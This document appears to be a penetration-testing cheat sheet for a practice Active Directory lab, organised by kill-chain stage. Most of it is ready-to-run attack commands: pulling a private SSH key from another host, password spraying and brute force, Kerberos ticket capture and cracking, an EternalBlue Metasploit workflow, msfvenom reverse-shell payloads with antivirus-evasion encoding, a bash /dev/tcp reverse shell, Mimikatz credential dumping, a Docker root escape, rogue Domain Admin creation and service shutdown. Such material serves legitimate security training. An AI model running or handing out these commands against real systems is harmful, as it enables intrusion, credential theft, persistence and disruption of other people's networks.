# Section 1. Kali Linux Basics
## Kali Linux Network Configuration (GUI)

### Step 1. Open Network Settings
- Click the Kali icon (top-left)
- Search for Advanced Network Configuration
- Open it

### Step 2. Select Connection
- Click Wired connection 1
- Click the Settings (gear icon)

### Step 3. Set Static IP
- Go to IPv4 Settings
- Change Method to Manual
- Click Add and enter:
  - IP Address: 10.5.5.5
  - Netmask: 255.0.0.0
  - Gateway: 10.0.0.1

### Step 4. Add DNS and Domain
- Add the IP address of the target Windows DC as your DNS Server: 192.168.1.111
- Add the domain name of the target Windows DC as the Search Domain: practice.corp

### Step 5. Save and Apply
- Click Save
- Reboot/restart your Kali or run below command in the terminal:
```
sudo systemctl restart NetworkManager
```

## ping
```
ping <IP>                          # used to test the conectivity
Example: ping 10.10.10.10          # test connectivity with the IP address of 10.10.10.10
```
## nano
```
Step 1.
nano <name of the file>            # create or edit a file
Example: nano file.txt             # create a file with the name of file.txt

Step 2.
After adding you text or editing the file, press "ctrl+s" to save the file.

Step 3.
Press "ctrl+x" to exit.
```
## Download a file in terminal
```
curl http://192.168.1.113/.ssh/id_rsa -o id_rsa
wget http://192.168.1.113/.ssh/id_rsa
```

---

# Section 2. Rconnaissance

## 1. Nmap
- Nmap syntax
```
nmap <scan-types> <options> <target>
```
- Nmap Scan Techniques
```
SYN Scan (-sS): Stealthy, half-open handshake.
Connect Scan (-sT): Full TCP connection.
UDP Scan (-sU): Slower, stateless protocol.
```
- Nmap Host Discovery
```
nmap -sn 10.129.2.0/24           # Scan network range for hosts only (no ports)
nmap -iL hosts.txt               # Scan IP list in “hosts.txt” file
nmap 10.129.2.28-30              # Scan multiple IPs
```
- Nmap Service & Version Detection
```
nmap -sV 10.129.2.28-29          # detect service versions running on the target hosts
```
- Nmap OS Detection
```
nmap -O 10.129.2.28-29           #  Detect the operating system of the target
```
- Nmap Scripting Engine (NSE)
```
nmap --script <script name> <target address>
Example: nmap --script vuln 10.129.2.28

Common scripts: vuln, auth, brute, discovery, exploit

HINT: add --min-rate 5000 to speed up scan, BUT this may cause errors or crashes...
```
- Nmap Saving Results
```
Formats: -oN (Normal), -oG (grepable), -oX (XML), -oA (all formats)
Example: nmap -oA scan_results 10.129.2.28-29
Files Generated: scan_results.nmap, scan_results.gnmap, scan_results.xm
```
- Nmap Recommended Scans
```
1. Fast:
sudo nmap -A --oX target_scan.xml -iL hosts.txt

2. Robust:
sudo nmap -A --script vuln -vv -p --oX target_scan.xml -iL hosts.txt --min-rate 5000 --stats-every=5s

-A means –sV –sC –O
-vv means verbose output
-p- means scan all ports
-oX means output to xml file
--script vuln means run vulnerability scan script
```
- Nmap View Results in Browser
```
xsltproc target_scan.xml -o target_scan.html
```

## 2. SMB Enum
### NetExec
  - Syntax
```
nxc <protocol> <ip address> <options>
```
  - NetExec User Enumeration 
```
nxc smb 10.129.2.28 -u '' -p '' --users                            # lists users
nxc smb 10.129.2.28 -u '' -p '' --rid-brute                        # use this if you don't know about any existing users
nxc smb 10.129.2.28 -u 'Guest' -p '' --rid-brute                   # use the command with the Guest default account if the first command didn't work
nxc smb 10.129.2.28 -u 'john' -p 'Pass123' --rid-brute             # use this if you know a username and it's password on the target
```
  - NetExec Share Enumeration
```
Note: If you know a valid username and password on the target machine, use those credentials instead of Guest with no password.

nxc smb 10.129.2.28 -u 'Guest' -p '' --shares                      # list available SMB shares
nxc smb 10.129.2.28 -u 'Guest' -p '' -M spider_plus                # enumerate shares and collect detailed information using spider_plus module
nxc smb 10.129.2.28 -u 'Guest' -p '' --spider all --pattern txt    # download all .txt files from all accessible shares
```
 - NetExec Group Enumeration
```
nxc ldap <DC-IP> -u <user> -p <password> --group                   # List all groups
nxc ldap <DC-IP> -u <user> -p <password> --group "Domain Admins"   # List members of the Domain Admins group
```
 - NetExec Passowrd Policy Enumeration
```
nxc smb 10.5.10.50 --pass-pol
```
 - NetExec SMB/RDP Password Attacks
```
# Password Spraying Attack
nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 --ignore-pw-decoding

# Brute Force with a wordlist (Dictionary Attack)
nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding


# -u (path to users file)
# -p (Passwords to try for each users or path to wordlist)
# --ignore-pw-decoding (required to work with rockyou.txt)
```
### enum4linux
```
sudo enum4linux -a -A 192.168.220.30
```
### smbclient
```
# SMB loging if you know a user name and password
smbclient -U <username> //<ip>/<share>
Example: smbclient -U student //10.5.10.30/share
Example2: smbclient //192.168.1.132/share -U john@practice.local

# SMB null authentication (try that if you want to login without username and password)
smbclient //<ip>/<share> -N
Example: smbclient //10.5.10.30/po-shares -N
```
## 3. GoBuster
```
Syntax:
gobuster [mode] -u [target ip] -w [wordlist]

Example:
gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

---

# Section 3. Weaponization
 - NetExec SMB/RDP Password Attacks
```
# Password Spraying Attack
nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 --ignore-pw-decoding

# Note: To see the top 5 most used passwords, use this command:
head -n 5 /usr/share/wordlists/rockyou.txt

# Brute Force with a wordlist (Dictionary Attack)
nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding


# -u (path to users file)
# -p (Passwords to try for each users or path to wordlist)
# --ignore-pw-decoding (required to work with rockyou.txt)
```
 - Impacket Get-NPUsers
```
# Allows us to capture Kerberos Tickets for users that do not require Kerberos pre authentication
Impacket-GetNPUsers -request -dc-ip 10.129.2.28 example.com/ -usersfile users.txt -format hashcat -outputfile kerb.hash

# -request (requests Kerberos ticket)
# -dc-ip (ip address of domain controller)
# example.com/ (domain name)
# -usersfile (text file with usernames to check)
# -format (password cracking format)
# -outputfile (name of file to save with tickets)
```
 - Cracking Hashes/Tickets with Hashcat
```
# Syntax: hashcat -a <attack-mode> -m <hash-type> <hash> <wordlist>
Example 1: hashcat kerb.hash /usr/share/wordlist/rockyou.txt
Example 2: hashcat -a 0 -m 18200 kerb.hash /usr/share/wordlist/rockyou.txt

# List of hash types:
https://hashcat.net/wiki/doku.php?id=example_hashes
```
 - Searchsploit
```
# We can search for exploits and vulnerabilities in software based on our nmap results using searchsploit

# Syntax: searchsploit <software and version>
# Examples:
searchsploit httpd 2.4
searchsploit -m <script name>                    # copies found exploits to your current directory
```
 -  Metasploit
```
# Example Workflow

1. Run Metasploit
msfconsole
2. Search for an exploit
search eternalblue
3. Use the exploit
use exploit/windows/smb/ms17_010_psexec
4. Set options
set RHOSTS 10.129.2.28
set LHOST eth0
5. Execute payload
exploit

```
 - Msfvenom
```
# A command-line tool for generating payloads (e.g., reverse shells, bind shells).

# Syntax: msfvenom -p <payload> <options> -f <format> -o <output_file>

# Example Windows Payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx

# Example Linux Payload:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx

# Example Encoded Payload (AV bypass):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -e x86/shikata_ga_nai -f aspx -o encoded_shell.aspx
```
 - Bloodhound
```
# Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.

# Example Workflow
1. Gernerate JSON files from the Active Directory database
bloodhound-python -u mark.landry -p 987654321 -ns 10.129.2.28 -d example.com -c all

# -u username
# -p password
# -d domain name
# -ns nameserver (domain controller)
# -c all (gather all json files)

2. Go to browser and typle:
localhost:8080

3. Enter username and password to login

4. Upload the JSON files
```

---

# Section 4. Delivery
 - Delivering Files via SSH/SCP
```
# Note: It requires SSH on the machines
# Syntax: scp <source file> <destination file>
# scp user@target:/path/to/destination payload.exe

# Example:
scp bob@10.5.10.50:/home/bob payload.exe
scp payload.exe administrator@10.5.10.30:/C:/Users/Administrator/Desktop/users.txt
```
 - Delivering Files via SSH/rsync
```
# Note: It requires SSH on the machines
# Syntax: rsync -avz payload.txt user@target:/path/to/destination

# Example:
rsync -azv /opt/linpeas/linpeas.sh mlandry@10.129.2.29:/tmp
```
- Delivering Files via xfreerdp
```
# Syntax: xfreerdp3 /v:target_ip /u:username /p:password /d:domain-name /dynamic-resolution /drive:shared,/path/to/local/files
# /drive: Shares a local directory with the target.
# Connect to the target via RDP.
# Access the shared drive from the target machine (e.g., \\tsclient\shared).
# Copy files from the shared drive to the target.

# Example:
xfreerdp3 /v:10.5.10.30 /u:mark /p:987654321 /d:practice.local /dynamic-resolution /drive:shared,/home/kali/
```
 - Delivering Files via SMB
```
1. Using SMBclient: smbclient //target_ip/sharename -U username
# Authenticate and use "put" to upload files.
# Example:
smbclient //10.129.2.28/all –U Guest
smb: \> put shell.exe

2. Mounting SMB Share: sudo mount -t cifs //target_ip/sharename /mnt -o username=user,password=pass
#  Then copy files to /mnt to deliver them to the target.
# Example:
sudo mount -t cifs //10.129.2.28/all /mnt -o username=mark.landry,password=987654321
sudo cp /opt/winpeas/winPEASany.exe /mnt
```
 - Delivering Files via Web Form
```
1. Identify a file upload form on the target website.
2. Upload a malicious file (e.g., .php, .jpg with embedded code).
```

# Section 5. Initial Access

## Windows Access

 - **xfreerdp3**
```bash
# Syntax: xfreerdp3 /v:target_ip /u:username /p:password /d:domain-name /dynamic-resolution /drive:shared,/path/to/local/files
# /drive: Shares a local directory with the target.
# Connect to the target via RDP.
# Access the shared drive from the target machine (e.g., \\tsclient\shared).
# Copy files from the shared drive to the target.

# Example:
xfreerdp3 /v:10.5.10.30 /u:mark /p:987654321 /d:practice.local /dynamic-resolution /drive:shared,/home/kali/
```

 - **evil-winrm**
```bash
# Syntax:
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

# Example:
evil-winrm -i 192.168.1.222 -u john -p my-pass
```

 - **Reverse Shells**
```bash
# What is a reverse shell?
# A reverse shell is when a target machine connects back to YOUR machine,
# giving you remote access to control it.

Steps:

1. Make sure you have a way to send your file (payload) to the target machine
   and run it there.
   Example: a file upload feature, shared folder, or command execution.

2. Create your payload using msfvenom.
   (You can search "msfvenom" in this document for more details)

   Example:
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx

   Explanation:
   - LHOST = your IP address (where the target will connect back)
   - LPORT = port on your machine to listen on
   - shell.aspx = the file that will run on the target

3. Start Metasploit and set up a listener (this waits for the connection):

   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp   # must match msfvenom
   set LHOST 10.100.0.1                              # same IP as above
   set LPORT 4444                                    # same port as above
   run

4. Send (deliver) the payload file to the target machine.

5. Execute the payload on the target.

6. If everything works, the target machine will connect back to you,
   and you will get a remote shell (control of the system).
```
## Linux Access

 - **SSH**
```bash
# SSH lets you remotely log into a Linux machine

# 1. If you have an SSH key
# Syntax:
ssh -i id_rsa user@target

# Example:
ssh -i id_rsa john@192.168.2.20

# Important note: Make sure the SSH key has the correct permission before connecting:
chmod 600 id_rsa

# 2. If you have a password
# Syntax:
ssh user@target

# Example:
ssh john@192.168.2.20
```

 - **Reverse Shells**
```bash
# What is a reverse shell?
# A reverse shell makes the target machine connect back to YOUR machine,
# giving you remote command access.

Steps:

1. Make sure you can run commands on the target machine
   (for example: command injection, web shell, etc.)

2. Start a listener on YOUR machine (this waits for the connection):
   nc -lvnp 9001

3. Run a reverse shell command on the target machine

   You can find many ready-to-use commands here:
   https://www.revshells.com/

Examples of common reverse shell commands:

# Bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1

# Groovy reverse shell
["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"].execute()
```

# Section 6. Actions on Objective
## 1. Privilege Escalation
### Windows Privilege Escalation
- ACL Abuse Chain with BloodHound
```
# Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.

# Example Workflow
1. Gernerate JSON files from the Active Directory database
bloodhound-python -u mark.landry -p 987654321 -ns 10.129.2.28 -d example.com -c all

# -u username
# -p password
# -d domain name
# -ns nameserver (domain controller)
# -c all (gather all json files)

2. Go to browser and typle:
localhost:8080

3. Enter username and password to login

4. Upload the JSON files
```
- Credential Dumping (Mimikatz)
```
# Mimikatz is a tool used to extract passwords and authentication data from Windows memory.

1. Deliver mimikatz.exe to the target machine using any available method.
2. Open Command Prompt or PowerShell as Administrator (if possible).
3. Run:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
4. Check the output for usernames and possible plain-text passwords or hashes.
```
- winPeas
```
1. Deliver the winpeas file to the target
2. Run it
3. Look for paths to escalate privileges
```

### Linux Privilege Escalation
- Set SUID
```
1. Find the files or executables with set SUID bit:
find / -perm -u=s -type f 2>/dev/null

2. Check the GTFOBins to find an exploit for that:
https://gtfobins.org/
```
- Capabilities
```
1. Find the Capabilities:
getcap -r / 2>/dev/null

2. Check the GTFOBins to find an exploit for that:
https://gtfobins.org/
```
- If an unprivileged user is a member of the Docker group, they can potentially gain full access to the host system.
```
docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/sh

or

docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
## 2. Administrative Account Creation
- Create a Domain Admin account on Windows
```
New-ADUser `
-Name "John Doe" `
-GivenName "John" `
-Surname "Doe" `
-SamAccountName "jdoe" `
-UserPrincipalName "jdoe@practice.corp" `
-Path "CN=Users,DC=practice,DC=corp" `
-AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
-Enabled $true `
-PasswordNeverExpires $true `
-ChangePasswordAtLogon $false

Add-ADGroupMember -Identity "Domain Admins" -Members "jdoe"
```
- Create a local Administrator on Windows
```
New-LocalUser -Name "jdoe" -Password (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "jdoe"
```
- Create a local sudo user on Linux
```
sudo adduser jdoe
sudo usermod -aG sudo jdoe
```

## 3. Service Disruption
### Windows Services
- Check service status
```
# Get specific service
Get-Service -Name sshd

# Get only the status value
(Get-Service -Name sshd).Status
```
- Service control commands
```
# Stop service
net stop sshd
Stop-Service -Name sshd

# Start service
net start sshd
Start-Service -Name sshd

# Restart service
Restart-Service -Name sshd
```
- List services
```
# All services
Get-Service

# Only running services
Get-Service | Where-Object { $_.Status -eq 'Running' }

# Filter by display name
Get-Service | Where-Object { $_.DisplayName -like "*sshd*" }
```
- Change service type
```
# Set to Manual
Set-Service -Name "sshd" -StartupType Manual

# Set to Disabled
Set-Service -Name "sshd" -StartupType Disabled

# Set to Automatic
Set-Service -Name "sshd" -StartupType Automatic
```

### Linux Services and Containers

- Linux Services
```bash
# Manage services using systemctl

# Stop a service
sudo systemctl stop <service_name>
# Example:
sudo systemctl stop apache2

# Disable a service (won’t start on boot)
sudo systemctl disable <service_name>
# Example:
sudo systemctl disable apache2

# Start a service
sudo systemctl start <service_name>
# Example:
sudo systemctl start apache2

# Restart a service
sudo systemctl restart <service_name>
# Example:
sudo systemctl restart apache2

# Enable a service (start on boot)
sudo systemctl enable <service_name>
# Example:
sudo systemctl enable apache2
```

- Containers (Docker)
```bash
# Stop Docker service
sudo systemctl stop docker

# Stop all running containers
docker stop $(docker ps -q)

# Stop and remove containers using docker-compose
# (replace /path/to/docker-compose.yml with the actual file path)
docker compose -f /path/to/docker-compose.yml down
```

---

# Section 7. Miscellaneous
### Wordlists
```
/usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
```
### Peass
```
/usr/share/peass
```
